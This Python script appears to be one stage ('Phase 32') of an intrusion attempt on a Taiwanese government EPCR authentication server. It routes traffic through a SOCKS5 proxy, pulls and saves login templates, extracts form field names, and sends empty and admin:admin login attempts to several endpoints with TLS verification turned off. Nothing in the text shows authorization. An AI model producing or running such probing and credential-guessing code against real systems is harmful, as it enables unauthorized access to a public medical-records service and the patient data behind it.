#!/usr/bin/env python3
"""Phase 32: EPCR auth server - POST login attempts + get templates."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, re, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PR = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
HE = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/plain, */*'}

# 1. Try GET login template
for path in ['/templates/login.html', '/templates/login2fa.html', '/templates/user.html']:
    try:
        r = requests.get(f'https://epcr.tpf.gov.tw:4004{path}', proxies=PR, headers=HE, verify=False, timeout=15)
        print(f"GET :4004{path} -> {r.status_code}, len={len(r.text)}, ct={r.headers.get('Content-Type','')}")
        if r.status_code == 200 and len(r.text) > 100:
            fname = path.replace('/', '_')
            with open(f'/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/epcr_auth_server/{fname}', 'w') as f:
                f.write(r.text)
            print(f"  Saved: {fname}")
            # Extract form details
            form = re.search(r'<form[^>]*>(.*?)</form>', r.text, re.I | re.DOTALL)
            if form:
                inputs = re.findall(r'<input[^>]+name="([^"]+)"[^>]*>', form.group(0))
                print(f"  Form inputs: {inputs}")
            # Check for ng-model
            models = re.findall(r'ng-model\s*=\s*["\']?([a-zA-Z.]+)["\']?', r.text)
            print(f"  ng-models: {models}")
    except Exception as e:
        print(f"GET :4004{path} -> ERR {str(e)[:80]}")

# 2. Try POST to /login (no auth)
print("\n=== POST /login attempts ===")
for path in ['/login', '/sso/login', '/auth/login']:
    try:
        # POST without body
        r = requests.post(f'https://epcr.tpf.gov.tw:4004{path}', proxies=PR, headers=HE, verify=False, timeout=15)
        print(f"POST :4004{path} (empty) -> {r.status_code}, len={len(r.text)}, ct={r.headers.get('Content-Type','')}")
        if len(r.text) < 500:
            print(f"  Body: {r.text[:200]}")
        
        # POST with dummy credentials
        r2 = requests.post(f'https://epcr.tpf.gov.tw:4004{path}', proxies=PR, headers=HE, 
                          json={'username': 'admin', 'password': 'admin', 'captcha': 'test', 'domain': 'AUTH_SERVER'},
                          verify=False, timeout=15)
        print(f"POST :4004{path} (admin:admin) -> {r2.status_code}, len={len(r2.text)}, ct={r2.headers.get('Content-Type','')}")
        if r2.text and len(r2.text) < 500:
            print(f"  Body: {r2.text[:200]}")
    except Exception as e:
        print(f"POST :4004{path} -> ERR {str(e)[:80]}")

# 3. Get the login template content
print("\n=== Login template ===")
try:
    r = requests.get('https://epcr.tpf.gov.tw:4004/templates/login.html', proxies=PR, headers=HE, verify=False, timeout=15)
    if r.status_code == 200:
        print(r.text[:3000])
except Exception as e:
    print(f"Error: {str(e)[:100]}")
